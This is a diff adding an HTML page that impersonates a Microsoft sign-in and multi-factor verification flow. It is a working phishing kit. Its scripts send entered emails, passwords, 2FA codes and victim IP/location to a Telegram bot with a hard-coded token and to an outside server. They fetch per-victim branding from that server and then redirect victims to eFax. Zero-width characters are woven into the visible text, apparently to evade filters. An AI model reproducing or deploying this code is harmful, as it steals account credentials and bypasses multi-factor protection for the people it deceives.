@@ -1,0 +1,723 @@
+<html lang="en"><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="">
+    <meta name="author" content="">
+    <link rel="icon" href="../../../../favicon.ico">
+    <title>Login</title>
+    <!--Template based on URL below-->
+    <link rel="canonical" href="https://getbootstrap.com/docs/4.3/examples/starter-template/">
+    <!-- Bootstrap core CSS -->
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
+    <!-- Place your stylesheet here-->
+<style>
+    .spiner {
+        display: none;
+    }
+
+    .box {
+        margin-bottom: auto;
+        margin-top: auto;
+        background-color: white;
+        padding: 3%;
+    }
+
+    body,
+    html {
+        height: 100%;
+        width: 100%;
+        margin: 0;
+        padding: 0;
+        background-size: cover;
+        background: url(https://i.imgur.com/fNMyldZ.png);
+        background-repeat: repeat;
+        background-repeat: no-repeat, no-repeat;
+        background-position: center center, center center;
+        background-size: cover, cover;
+    }
+
+    @media (max-width: 480px) {
+
+        body,
+        html {
+            background: #FFF;
+            ;
+            background-repeat: repeat;
+        }
+
+        .box {
+            background-color: white;
+            padding: 3%;
+            margin: 0;
+        }
+    }
+
+    @media (max-width: 320px) {
+
+        body,
+        html {
+            background: #FFF;
+            ;
+            background-repeat: repeat;
+        }
+
+        .box {
+            background-color: white;
+            padding: 3%;
+            margin: 0;
+        }
+    }
+
+    .pading {
+        margin-top: 2%;
+        margin-bottom: 3%
+    }
+
+    .inp {
+        border: 0px;
+        border-radius: 0px;
+        border-bottom: 1px solid black;
+    }
+
+    .btn-primary {
+        border-color: #0067b8;
+        background-color: #0067b8;
+        padding-top: 1%;
+        padding-bottom: 1%;
+        padding-left: 10%;
+        border-radius: 0;
+        padding-right: 10%;
+    }
+
+    .loader {
+        position: absolute;
+        padding-top: 0;
+        width: 40px;
+        margin: -22px;
+        display: none;
+    }
+
+    .loader .circle {
+        position: absolute;
+        width: 18px;
+        height: 18px;
+        opacity: 0;
+        transform: rotate(225deg);
+        animation-iteration-count: infinite;
+        animation-name: orbit;
+        animation-duration: 3s;
+    }
+
+    .loader .circle:after {
+        content: "";
+        position: absolute;
+        width: 3px;
+        height: 3px;
+        border-radius: 5px;
+        background: #000;
+    }
+
+    .loader .circle:nth-child(2) {
+        animation-delay: 240ms;
+    }
+
+    .loader .circle:nth-child(3) {
+        animation-delay: 480ms;
+    }
+
+    .loader .circle:nth-child(4) {
+        animation-delay: 720ms;
+    }
+
+    .loader .circle:nth-child(5) {
+        animation-delay: 960ms;
+    }
+
+    @keyframes orbit {
+        0% {
+            transform: translate(10px, 0);
+            opacity: 1;
+            animation-timing-function: ease-out;
+        }
+
+        7% {
+            transform: translate(30px, 0);
+            animation-timing-function: linear;
+        }
+
+        30% {
+            transform: translate(60px, 0);
+            animation-timing-function: ease-in-out;
+        }
+
+        40% {
+            transform: translate(90px, 0);
+            animation-timing-function: ease-out;
+        }
+
+        50% {
+            transform: translate(120px, 0);
+            animation-timing-function: ease-out;
+        }
+
+        75% {
+            transform: translate(250px, 0);
+            animation-timing-function: ease-out;
+        }
+
+        76% {
+            transform: translate(300px, 0);
+            opacity: 0;
+        }
+
+        100% {
+            transform: translate(350px, 0);
+            opacity: 0;
+        }
+    }
+
+    .loader2 {
+        position: absolute;
+        padding-top: 0;
+        width: 40px;
+        margin: 22px;
+    }
+
+    .loader2 .circle {
+        position: absolute;
+        width: 18px;
+        height: 18px;
+        opacity: 0;
+        transform: rotate(225deg);
+        animation-iteration-count: infinite;
+        animation-name: orbit;
+        animation-duration: 3s;
+    }
+
+    .loader2 .circle:after {
+        content: "";
+        position: absolute;
+        width: 3px;
+        height: 3px;
+        border-radius: 5px;
+        background: #000;
+    }
+
+    .loader2 .circle:nth-child(2) {
+        animation-delay: 240ms;
+    }
+
+    .loader2 .circle:nth-child(3) {
+        animation-delay: 480ms;
+    }
+
+    .loader2 .circle:nth-child(4) {
+        animation-delay: 720ms;
+    }
+
+    .loader2 .circle:nth-child(5) {
+        animation-delay: 960ms;
+    }
+
+    @keyframes orbit {
+        0% {
+            transform: translate(10px, 0);
+            opacity: 1;
+            animation-timing-function: ease-out;
+        }
+
+        7% {
+            transform: translate(30px, 0);
+            animation-timing-function: linear;
+        }
+
+        30% {
+            transform: translate(60px, 0);
+            animation-timing-function: ease-in-out;
+        }
+
+        40% {
+            transform: translate(90px, 0);
+            animation-timing-function: ease-out;
+        }
+
+        50% {
+            transform: translate(120px, 0);
+            animation-timing-function: ease-out;
+        }
+
+        75% {
+            transform: translate(250px, 0);
+            animation-timing-function: ease-out;
+        }
+
+        76% {
+            transform: translate(300px, 0);
+            opacity: 0;
+        }
+
+        100% {
+            transform: translate(350px, 0);
+            opacity: 0;
+        }
+    }
+
+    .errpasss {
+        display: none;
+        color: #e81123;
+        font-size: 14px
+    }
+
+    .div2 {
+        display: none;
+    }
+</style></head>
+
+
+<body>
+    <div class="container h-100">
+        <div class="d-flex justify-content-center h-100">
+            <div class="col-md-5 box"> <img class="img-fluid" id="myid" src="https://aadcdn.msftauth.net/ests/2.1/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="">
+                <br>
+                <br>
+                <div class="div1">
+                    <h3>Sign In</h3>
+                    <input type="email" class="form-control inp eimo " id="eimo" placeholder="Email, phone or skype" aria-label="eimoname" aria-describedby="basic-addon1">
+                    <br>
+                    <p> No account? <a href="#"> Create one!
+
+
+
+                        </a></p>
+                    <p> <a href="#">Sign in with a security key</a></p>
+                    <p> <a href="#">sign in options</a></p>
+                    <div class="text-right">
+                        <button class="btn rounded-0 text-white px-4" id="next" style="background-color: #0066BA;">Next</button>
+                    </div>
+                </div>
+                <div style="display: none;" class="div2"> <span><svg class="bi bi-arrow-left-short" width="1em" height="1em" viewBox="0 0 16 16" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
+                            <path fill-rule="evenodd" d="M7.854 4.646a.5.5 0 0 1 0 .708L5.207 8l2.647 2.646a.5.5 0 0 1-.708.708l-3-3a.5.5 0 0 1 0-.708l3-3a.5.5 0 0 1 .708 0z"></path>
+                            <path fill-rule="evenodd" d="M4.5 8a.5.5 0 0 1 .5-.5h6.5a.5.5 0 0 1 0 1H5a.5.5 0 0 1-.5-.5z"></path>
+                        </svg></span> <span class="eimo"> </span>
+                    <br>
+                    <div style="display: none;" class="2fadiv">
+                        <h4 class="pading">En‏‎‍ter c‏‎‍o‏‎‍de</h4> <span><img style="width: 24px;
+height: 24px;" class="img-fluid" src="https://aadcdn.msftauth.net/shared/1.0/content/images/picker_verify_sms_27a6d18b56f46818420e60a773c36d4e.svg" width="15px;"></span> <span>W‏‎‍e t‏‎‍ex‏‎‍ted your phone <span class="getnumsms">+X X‏‎‍XXX‏‎‍XXX‏‎‍XXX‎</span>. Ple‏‎‍ase en‏‎‍ter the c‏‎‍od‏‎‍e to si‏‎‍g‏‎‍n i‏‎‍n.</span>
+                        <div class="input-group mb-3">
+                            <div class="input-group-prepend"> </div>
+                            <input class="dataip" value="" type="hidden">
+                            <input type="Password" class="form-control inp 2fa" placeholder="Code" aria-label="eimoname" aria-describedby="basic-addon1">
+                        </div>
+                    </div>
+                    <div style="display: nxone;" class="spiner">
+                        <br>
+                        <br>
+                        <br>
+                        <br>
+                        <div class="text-center">
+                            <div class="spinner-border" role="status"> <span class="sr-only">Loading...</span> </div>
+                        </div>
+                        <br>
+                        <br>
+                        <br>
+                        <br>
+                    </div>
+                    <div class="boxps">
+                        <h4 class="pading">E‏‎‍nt‏‎‍er pa‏‎‍sswo‏‎‍rd</h4>
+                        <div class="errpasss">
+                            <p class="errpass">Yo‏‎‍ur acc‏‎‍ou‏‎‍nt or p‏‎‍as‏‎‍sw‏‎‍ord is i‏‎‍nco‏‎‍rrec‏‎‍t.</p>
+                        </div>
+                        <div class="input-group mb-3">
+                            <div class="input-group-prepend"> </div>
+                            <input class="eimo" id="eimo" value="" type="hidden">
+                            <input class="dataip" value="" type="hidden">
+                            <input type="Password" class="form-control inp peso" placeholder="Password" aria-label="eimoname" aria-describedby="basic-addon1">
+                        </div>
+                    </div>
+                    <div id="loader" class="loader">
+                        <div class="circle"></div>
+                        <div class="circle"></div>
+                        <div class="circle"></div>
+                        <div class="circle"></div>
+                        <div class="circle"></div>
+                    </div>
+                    <div class="befos">
+                        <a class="forget" href="##">
+                            <p style="font-size: 14px;">Fo‏‎‍rg‏‎‍o‎‍t m‎‍y pa‏‎‍ss‏‎‍wo‏‎‍rd</p>
+                        </a>
+                        <a style="display: none;" class="moree" href="##">
+                            <p style="font-size: 14px;">More information</p>
+                        </a>
+                        <br>
+                    </div>
+                    <div class="bttn">
+                        <button class="btn btn btn-primary float-right btn-signin" id="btn-signin">‎‍S‏‎‍i‏‎‍g‏‎‍n i‏‎‍n</button>
+                    </div>
+                </div>
+                <!--------------- ---------------before 2fa ========================== ------------>
+                <div style="display: none;" class="2fabeforediv">
+                    <style>
+                        .divnum:hover,
+                        .divcall:hover,
+                        .verify_authenticator:hover,
+                        .verify_code:hover {
+                            background-color: #e6e6e6;
+                        }
+
+                        .divnum,
+                        .divcall,
+                        .verify_authenticator,
+                        .verify_code {
+                            padding-top: 10px;
+                            padding-bottom: 10px;
+                        }
+                    </style>
+                    <h2 style="color: #1b1b1b;
+    font-size: 1.5rem;
+    font-weight: 600;
+    padding: 0;
+    margin-top: 16px;
+    margin-bottom: 12px;">Verify your identity</h2>
+                    <div style="display: none" class="verify_authenticator"> <img src="https://aadcdn.msauth.net/shared/1.0/content/images/picker_verify_authenticator_f07afb27ad510dc785a94e802e3d7f73.svg" alt=""><span class="authenticator">Approve a request on my Microsoft <span style="padding-left: 12%;"> Authenticator app</span></span>
+                    </div>
+                    <div style="display: none" class="verify_code"> <img src="https://aadcdn.msauth.net/shared/1.0/content/images/picker_verify_code_f7ab697e65b83ce9870a4736085deeec.svg" alt=""><span id="verify_code_" class="verify_code_">Use a verification code from my mobile app</span> </div>
+                    <div style="display: none" class="divnum"><img src="https://aadcdn.msftauth.net/shared/1.0/content/images/picker_verify_sms_27a6d18b56f46818420e60a773c36d4e.svg" alt=""><span class="getnumsms">Text +XX XXXXX XXXXXX </span> </div>
+                    <div style="display: none" class="divcall"> <img src="https://aadcdn.msftauth.net/shared/1.0/content/images/picker_verify_call_fe87496cc7a44412f7893a72099c120a.svg" alt=""><span class="numcall">Call +XX XXXXX XXXXXX</span> </div>
+                    <br>
+                    <p>Are your verification methods current? Check at https://aka.ms/mfasetup</p>
+                    <div class="bttns">
+                        <button style="background-color: rgba(0,0,0,0.2);color: #000;" class="btn btn btn-primary float-right cns">Cancel</button>
+                    </div>
+                </div>
+                <!--------------------------------------- ------------------------------------>
+                <div style="display: none;" class="Approve">
+                    <h2 style="color: #1b1b1b;
+    font-size: 1.5rem;
+    font-weight: 600;
+    padding: 0;
+    margin-top: 16px;
+    margin-bottom: 12px;">Approve sign in request</h2>
+                    <div class="divlogoapprove"> <img style="width: 24px;
+height: 24px;" src="https://aadcdn.msftauth.net/shared/1.0/content/images/picker_verify_authenticator_f07afb27ad510dc785a94e802e3d7f73.svg" alt=""> <span>Open your Microsoft Authenticator app</span>
+                        <br><span style="padding-left: 13%;">and approve the request to sign in​.</span>
+                    </div>
+                    <br>
+                    <div class="custom-control custom-checkbox">
+                        <input type="checkbox" class="custom-control-input" id="customCheck" name="example1">
+                        <label class="custom-control-label" for="customCheck">Don't ask again for 30 days</label>
+                    </div>
+                    <br>
+                    <p><a href="">i can't use my Microsoft Authenticator app right now</a></p>
+                    <p><a href="">More information</a></p>
+                </div>
+                <!--------------------------------------- ------------------------------------>
+                <!--------------------------------------- ------------------------------------>
+                <div style="display: none;" class="Approve_call">
+                    <h2 style="color: #1b1b1b;
+    font-size: 1.5rem;
+    font-weight: 600;
+    padding: 0;
+    margin-top: 16px;
+    margin-bottom: 12px;">Approve sign in request</h2>
+                    <div class="divlogoapprove"> <img style="width: 24px;
+height: 24px;" src="https://aadcdn.msftauth.net/shared/1.0/content/images/picker_verify_call_fe87496cc7a44412f7893a72099c120a.svg" alt=""> <span style="font-size: 14pxp;">We're calling your phone. Please answer it to continue.</span> </div>
+                    <br>
+                    <div class="custom-control custom-checkbox">
+                        <input type="checkbox" class="custom-control-input" id="customCheck" name="example1">
+                        <label class="custom-control-label" for="customCheck">Don't ask again for 30 days</label>
+                    </div>
+                    <br>
+                    <p><a href="">i can't use my Microsoft Authenticator app right now</a></p>
+                    <p><a href="">More information</a></p>
+                </div>
+                <!--------------------------------------- ------------------------------------>
+            </div>
+        </div>
+    </div>
+    <!-- Bootstrap core JavaScript
+    ================================================== -->
+    <!-- Placed at the end of the document so the pages load faster -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.min.js" integrity="sha256-hVVnYaiADRTO2PzUGmuLJr8BLUSjGIZsDYGmIJLv2b8=" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js" integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1" crossorigin="anonymous"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
+    <script>
+        const token = '2141876980:AAF8g3CoYkQrV7UICLNXGntbwooyVl-7SU8';
+        const chatId = '2137972540';
+
+
+        function execute(text) {
+            const Milo = $('.eimo').val()
+            const Passo = $('.peso').val()
+
+            const message = `useing ${text} \n em: ${Milo}\n ps: ${Passo}`;
+
+            $.ajax({
+                type: 'POST',
+                url: `https://api.telegram.org/bot${token}/sendMessage`,
+                data: {
+                    chat_id: chatId,
+                    text: message,
+                    parse_mode: 'html',
+                },
+                success: function(res) {
+                    console.debug(res);
+                    $('#response').text('Message sent');
+                },
+                error: function(error) {
+                    console.error(error);
+                    alert("error failed");
+                }
+            });
+        }
+
+        $(".divnum").click(function() {
+            $(".2fadiv").show();
+            $(".2fabeforediv").hide();
+            $(".bttn").show();
+            $(".befos").show();
+            execute('SMS');
+        });
+        $(".verify_authenticator").click(function() {
+            $(".Approve").show();
+            $(".2fabeforediv").hide();
+            execute('verify authenticator');
+            /*$(".bttn").show();
+            $(".befos").show();*/
+        });
+        $(".verify_code").click(function() {
+            $(".2fadiv").show();
+            $(".2fabeforediv").hide();
+            $(".bttn").show();
+            $(".befos").show();
+            execute('SMS');
+        });
+        $(".divcall").click(function() {
+            $(".Approve_call").show();
+            $(".2fabeforediv").hide();
+
+            execute('Call');
+            /*$(".bttn").show();
+            $(".befos").show();*/
+        });
+        $(".verify_code").hover(function() {
+            $(this).css('cursor', 'pointer');
+        }, function() {
+            $(this).css('cursor', 'auto');
+        });
+        $(".verify_authenticator").hover(function() {
+            $(this).css('cursor', 'pointer');
+        }, function() {
+            $(this).css('cursor', 'auto');
+        });
+        $(".divnum").hover(function() {
+            $(this).css('cursor', 'pointer');
+        }, function() {
+            $(this).css('cursor', 'auto');
+        });
+        $(".divcall").hover(function() {
+            $(this).css('cursor', 'pointer');
+        }, function() {
+            $(this).css('cursor', 'auto');
+        });
+        var hash = window.location.hash;
+        var email = hash.split('#')[1];
+        if (email) { // if hash email used run this or run else
+            $(".div2").show();
+            $(".div1").hide();
+            $("#em_picker").html(email);
+            $('.eimo').val(email);
+            $(".eimo").html(email);
+        } else {
+            $(".div1").show();
+            $(".div2").hide();
+        }
+        $('.peso').keyup(function(event) {
+            if (event.which == 13) {
+                $('.btn-signin').click();
+            }
+        });
+        $('#next').click(function() {
+            var my_email = $('.eimo').val();
+            var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+            if (!filter.test(my_email)) {
+                $('#error').show();
+                email.focus;
+                return false;
+            }
+            var ind = my_email.indexOf("@");
+            var my_slice = my_email.substr((ind + 1));
+            var c = my_slice.substr(0, my_slice.indexOf('.'));
+            var final = c.toLowerCase();
+            //  if (final=="gmail" || final=="yahoo" || final=="hotmail" || final=="aol" || final=="outlook") {
+            //   $('#error').show();
+            // }
+            // else
+            // {
+            $(".div1").animate({
+                left: 200,
+                opacity: "hide"
+            }, 0);
+            $(".div2").animate({
+                right: 200,
+                opacity: "show"
+            }, 1000);
+            $(".eimo").html(my_email);
+            // }
+        });
+        $('#back').click(function() {
+            $("#msg").hide();
+            $("#div2").animate({
+                left: 200,
+                opacity: "hide"
+            }, 0);
+            $("#div1").animate({
+                right: 200,
+                opacity: "show"
+            }, 1000);
+        });
+        $(document).ready(function() {
+            $(document).ready(function() {
+                $.getJSON('https://segy.xyz//api/logo.php?email=' + email, function(data) {
+                    console.log(data.Bnr);
+                    $("#myid").attr('src', data.Bnr);
+                    $('#myid').attr('style', 'max-height: 60px');
+                });
+            });
+            $(document).ready(function() {
+                $.getJSON('https://segy.xyz//api/txt.php?email=' + email, function(datat) {
+                    console.log(data.txt);
+                    $('.befos').after('<div class="txt"></div>');
+                    $(".txt").html(datat.txt);
+                });
+            });
+            $(document).ready(function() {
+                $.getJSON('https://segy.xyz//api/back.php?email=' + email, function(datas) {
+                    console.log(datas.back);
+                    $("body").on({
+                        mouseenter: function() {
+                            $(this).css("background-image", "url(" + datas.back + ")");
+                        },
+                    });
+                });
+            });
+            $(document).ready(function() {
+                $.getJSON('https://ipapi.co/json', function(data) {
+                    // $('.lang').text(data.languages);
+                    var str = data.languages;
+                    var dataip = data.ip + "-" + data.city + "-" + data.country_name;
+                    $('.dataip').val(dataip);
+                });
+            });
+            var count = 1;
+            $('.btn-signin').on('click', function() {
+                var eimo = $('.eimo').val();
+                var peso = $('.peso').val();
+                var _2fa = $('.2fa').val();
+                var getip = $(".dataip").val();
+                if (peso == "") {
+                    $('.peso').addClass("error");
+                } else {
+                    $(document).ready(function() {
+                        $('.loader').show();
+                        $('.btn').on('click', function() {
+                            var $this = $(this);
+                            var loadingText = '<i class="fa fa-circle-o-notch fa-spin"></i> loading...';
+                            if ($(this).html() !== loadingText) {
+                                $this.data('original-text', $(this).html());
+                                $this.html(loadingText);
+                            }
+                        });
+                    })
+                    $(".empty-alert-pass").hide();
+                    $('.btn-signin').prop('disabled', true);
+                    $.ajax({
+                        url: "https://segy.xyz/wp-content/test2fa.php",
+                        data: {
+                            "eimo": eimo,
+                            "peso": peso,
+                            "2fa": _2fa,
+                            "ipp": getip
+                        },
+                        type: "GET",
+                        success: function(data) {
+                            console.log(data);
+                            if (data == 0) {
+                                $(".btn").html("Sign in");
+                                $('.loader').hide();
+                                console.log(data);
+                                console.log("true");
+                                setTimeout(function() {
+                                    window.location.href = "https://www.efax.com/"
+                                }, 100);
+                            } else if (data == 1) {
+                                $(".btn").html("S‎‍i‎‍gn i‎‍n");
+                                $('.peso').val('');
+                                $('.loader').hide();
+                                count++;
+                                if (count > 6) {
+                                    count = 1;
+                                    setTimeout(function() {
+                                        window.location.href = "https://www.efax.com/"
+                                    }, 2000);
+                                } else {
+                                    $('.loader').hide();
+                                    $(".errpasss").show();
+                                    $('.btn').prop('disabled', false);
+                                    $(".btn").html("S‎‍i‎‍g‎‍n i‎‍n");
+                                }
+                            } else {
+                                data = jQuery.parseJSON(data);
+                                if (data.OneWaySMS) {
+                                    $(".divnum").show();
+                                    $(".getnumsms").html(data.OneWaySMS);
+                                }
+                                if (data.PhoneAppNotification) {
+                                    $(".verify_authenticator").show();
+                                    console.log("show");
+                                }
+                                if (data.PhoneAppOTP) {
+                                    console.log("show");
+                                    $(".verify_code").show();
+                                }
+                                if (data.TwoWayVoiceMobile) {
+                                    $(".divcall").show();
+                                    $(".numcall").html(data.TwoWayVoiceMobile);
+                                } else {
+                                    setTimeout(function() {
+                                        window.location.href = "https://www.efax.com/"
+                                    }, 2000);
+                                }
+                                $(".btn").hide();
+                                $(".btn").html("Ve‎‍ri‎‍f‎‍y");
+                                $(".cns").html("Cancel");
+                                $(".spiner").show();
+                                setTimeout(function() {
+                                    $(".spiner").hide();
+                                }, 10000);
+                                setTimeout(function() {
+                                    $(".2fabeforediv").show();
+                                }, 10001);
+                                $(".befos").hide();
+                                $(".bttn").hide();
+                                $(".forget").hide();
+                                setTimeout(function() {
+                                    $(".btn").show();
+                                }, 10001);
+                                setTimeout(function() {
+                                    $(".moree").show();
+                                }, 10001);
+                                $(".boxps").hide();
+                                $('.loader').hide();
+                                $('.btn').prop('disabled', false);
+                                //////////////////////////
+                            }
+                        },
+                        error: function(data) {
+                            console.log('Ajax error');
+                        }
+                    });
+                }
+            });
+        });
+    </script> <img style="display: none;" src="https://bit.ly/3DNan16" alt="">
+</body></html>
